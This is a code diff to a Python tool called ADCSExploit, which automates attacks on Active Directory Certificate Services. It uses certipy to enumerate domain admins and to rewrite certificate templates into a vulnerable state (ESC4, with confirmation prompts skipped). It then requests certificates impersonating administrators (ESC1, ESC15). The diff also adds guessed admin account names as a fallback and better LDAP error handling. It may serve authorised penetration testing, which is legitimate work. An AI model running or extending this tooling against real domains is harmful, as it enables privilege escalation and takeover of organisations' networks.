@@ -145,9 +145,6 @@ class LDAPConnection:
         
     def connect(self):
         """Establish LDAP/LDAPS connection"""
-        protocol = 'ldaps' if self.use_ldaps else 'ldap'
-        server_uri = f"{protocol}://{self.target}:{self.port}"
-        
         # Setup TLS configuration for LDAPS
         tls_config = None
         if self.use_ldaps:
@@ -158,7 +155,9 @@ class LDAPConnection:
             )
         
         server = ldap3.Server(
-            server_uri,
+            self.target,
+            port=self.port,
+            use_ssl=self.use_ldaps,
             get_info=ldap3.ALL,
             tls=tls_config
         )
@@ -181,9 +180,30 @@ class LDAPConnection:
                 user=user_dn,
                 password=password,
                 authentication=authentication,
-                auto_bind=True
+                auto_bind=True,
+                raise_exceptions=True
             )
+            
+            # Verify the connection is working by attempting a basic search
+            try:
+                test_search = self.connection.search(
+                    search_base="",
+                    search_filter="(objectClass=*)",
+                    search_scope=ldap3.BASE,
+                    attributes=[]
+                )
+                if not test_search:
+                    logging.warning(f"Test search failed: {self.connection.result}")
+            except Exception as test_e:
+                logging.warning(f"Connection test search failed: {test_e}")
+            
             return True
+        except ldap3.core.exceptions.LDAPBindError as e:
+            logging.error(f"LDAP bind failed: {e}")
+            return False
+        except ldap3.core.exceptions.LDAPException as e:
+            logging.error(f"LDAP connection error: {e}")
+            return False
         except Exception as e:
             logging.error(f"LDAP connection failed: {e}")
             return False
@@ -192,16 +212,34 @@ class LDAPConnection:
         """Perform LDAP search"""
         if not self.connection:
             raise Exception("LDAP connection not established")
+        
+        # Check if connection is still bound
+        if not self.connection.bound:
+            logging.error("LDAP connection is not bound")
+            return []
             
         try:
-            self.connection.search(
+            # Perform the search
+            success = self.connection.search(
                 search_base=search_base,
                 search_filter=search_filter,
                 attributes=attributes or ldap3.ALL_ATTRIBUTES
             )
+            
+            if not success:
+                logging.error(f"LDAP search failed: {self.connection.result}")
+                return []
+                
             return self.connection.entries
+            
+        except ldap3.core.exceptions.LDAPInvalidServerError as e:
+            logging.error(f"LDAP server error during search: {e}")
+            return []
+        except ldap3.core.exceptions.LDAPException as e:
+            logging.error(f"LDAP exception during search: {e}")
+            return []
         except Exception as e:
-            logging.error(f"LDAP search failed: {e}")
+            logging.error(f"Unexpected error during LDAP search: {e}")
             return []
     
     def close(self):
@@ -426,6 +464,7 @@ class ADCSExploit:
         try:
             # Get domain SID
             self.logger.info("Getting Domain SID")
+            self.logger.debug(f"Using domain DN: {self.domain_cn}")
             response = self.ldap_connection.search(
                 self.domain_cn,
                 '(objectClass=domain)',
@@ -437,6 +476,9 @@ class ADCSExploit:
                 self.logger.info(f"Received Domain SID: {domain_sid}")
             else:
                 self.logger.error("Could not retrieve domain SID")
+                # Set some common domain admin accounts as fallback
+                self.domain_admins = ["Administrator", "admin", "root"]
+                self.logger.warning(f"Using default admin account names: {self.domain_admins}")
                 return
             
             # Get Domain Admins group
@@ -592,6 +634,9 @@ class ADCSExploit:
                 self.logger.info(f"Found domain controllers: {', '.join(self.domain_controllers)}")
             else:
                 self.logger.warning("No domain controllers found")
+                # Use the target DC IP as fallback
+                self.domain_controllers = [self.target]
+                self.logger.warning(f"Using target DC as fallback: {self.target}")
                 
         except Exception as e:
             self.logger.error(f"Error enumerating domain controllers: {e}")
@@ -682,7 +727,10 @@ class ADCSExploit:
                         self.logger.debug(f"Security descriptor denied enrollment for {subject_alt}, trying next subject/method")
                         continue
                     else:
-                        self.logger.debug(f"{method['name']} failed for {subject_alt}: {result.stdout[:200]}...")
+                        self.logger.debug(f"{method['name']} failed for {subject_alt}")
+                        self.logger.debug(f"stdout: {result.stdout[:200]}...")
+                        if result.stderr:
+                            self.logger.debug(f"stderr: {result.stderr[:200]}...")
                         continue
                         
                 except subprocess.TimeoutExpired:
@@ -1091,32 +1139,15 @@ class ADCSExploit:
             
             auth_args = self.auth_manager.get_certipy_auth_args()
             
-            # Save current template configuration
-            save_cmd = [
-                "certipy", "template",
-                *auth_args.split(),
-                "-dc-ip", self.target,
-                "-template", template,
-                "-save-old"
-            ]
-            
-            # Add LDAP options
-            if self.use_ldaps:
-                save_cmd.extend(["-ldap-scheme", "ldaps"])
-                if not self.ldap_channel_binding:
-                    save_cmd.append("-no-ldap-channel-binding")
-            else:
-                save_cmd.extend(["-ldap-scheme", "ldap"])
-            
             try:
-                # Modify template to be vulnerable to ESC1
+                # Apply ESC1 configuration to make template vulnerable
                 modify_cmd = [
                     "certipy", "template",
                     *auth_args.split(),
                     "-dc-ip", self.target,
                     "-template", template,
-                    "-enable-client-auth",
-                    "-enable-san"
+                    "-write-default-configuration",
+                    "-force"  # Skip confirmation prompts
                 ]
                 
                 # Add LDAP options
@@ -1127,11 +1158,13 @@ class ADCSExploit:
                 else:
                     modify_cmd.extend(["-ldap-scheme", "ldap"])
                 
+                self.logger.debug(f"Running template modification command: {' '.join(modify_cmd)}")
+                
                 modify_result = subprocess.run(
                     modify_cmd,
                     capture_output=True,
                     text=True,
-                    timeout=60
+                    timeout=15  # Reduce timeout further
                 )
                 
                 if modify_result.returncode == 0:
@@ -1203,40 +1236,48 @@ class ADCSExploit:
                         except Exception as e:
                             self.logger.error(f"Certificate request failed for {admin} (ESC4): {e}")
                     
-                    # Restore original template configuration
-                    restore_cmd = [
-                        "certipy", "template",
-                        *auth_args.split(),
-                        "-dc-ip", self.target,
-                        "-template", template,
-                        "-restore"
-                    ]
-                    
-                    # Add LDAP options
-                    if self.use_ldaps:
-                        restore_cmd.extend(["-ldap-scheme", "ldaps"])
-                        if not self.ldap_channel_binding:
-                            restore_cmd.append("-no-ldap-channel-binding")
+                    # Restore original template configuration from backup
+                    backup_file = f"{template}.json"
+                    if Path(backup_file).exists():
+                        restore_cmd = [
+                            "certipy", "template",
+                            *auth_args.split(),
+                            "-dc-ip", self.target,
+                            "-template", template,
+                            "-write-configuration", backup_file
+                        ]
+                        
+                        # Add LDAP options
+                        if self.use_ldaps:
+                            restore_cmd.extend(["-ldap-scheme", "ldaps"])
+                            if not self.ldap_channel_binding:
+                                restore_cmd.append("-no-ldap-channel-binding")
+                        else:
+                            restore_cmd.extend(["-ldap-scheme", "ldap"])
+                        
+                        restore_result = subprocess.run(
+                            restore_cmd,
+                            capture_output=True,
+                            text=True,
+                            timeout=60
+                        )
+                        
+                        if restore_result.returncode == 0:
+                            self.logger.info(f"Successfully restored template {template} configuration")
+                        else:
+                            self.logger.warning(f"Failed to restore template {template} configuration")
                     else:
-                        restore_cmd.extend(["-ldap-scheme", "ldap"])
-                    
-                    restore_result = subprocess.run(
-                        restore_cmd,
-                        capture_output=True,
-                        text=True,
-                        timeout=60
-                    )
-                    
-                    if restore_result.returncode == 0:
-                        self.logger.info(f"Successfully restored template {template} configuration")
-                    else:
-                        self.logger.warning(f"Failed to restore template {template} configuration")
+                        self.logger.warning(f"No backup file found for template {template} - cannot restore")
                         
                 else:
-                    self.logger.warning(f"Failed to modify template {template} (ESC4): {modify_result.stderr}")
+                    self.logger.warning(f"Failed to modify template {template} (ESC4)")
+                    self.logger.debug(f"Template modification stdout: {modify_result.stdout}")
+                    self.logger.debug(f"Template modification stderr: {modify_result.stderr}")
+                    self.logger.debug(f"Return code: {modify_result.returncode}")
                     
             except subprocess.TimeoutExpired:
                 self.logger.error(f"Template modification timed out for {template} (ESC4)")
+                self.logger.warning(f"Skipping ESC4 exploitation for template {template} due to timeout")
             except Exception as e:
                 self.logger.error(f"Template modification failed for {template} (ESC4): {e}")
     
@@ -1337,13 +1378,15 @@ class ADCSExploit:
         
         for admin in self.domain_admins:
             for template in self.vulnerable_certificate_templates["ESC15"]:
-                self.logger.info(f"Requesting certificate for {admin} using template {template} with Application Policies injection (ESC15)")
+                self.logger.info(f"Requesting certificate for {admin} using template {template} (ESC15 - EKUwu)")
                 
-                # Use UPN with domain for ESC15
+                # ESC15 (EKUwu) - exploit Schema Version 1 templates by requesting with UPN
                 admin_upn = f"{admin}@{self.domain}" if "@" not in admin else admin
+                self.logger.debug(f"Attempting ESC15 for {admin_upn} using template {template}")
+                
+                # For ESC15, we don't need -application-policies, just request normally
                 success, result = self.request_certificate_with_fallback(
-                    admin_upn, template, "_esc15", 
-                    ["-application-policies", "Client Authentication"]
+                    admin_upn, template, "_esc15"
                 )
                 
                 if success:
@@ -1613,4 +1656,4 @@ def main():
 
 
 if __name__ == "__main__":
-    main() 
+    main()
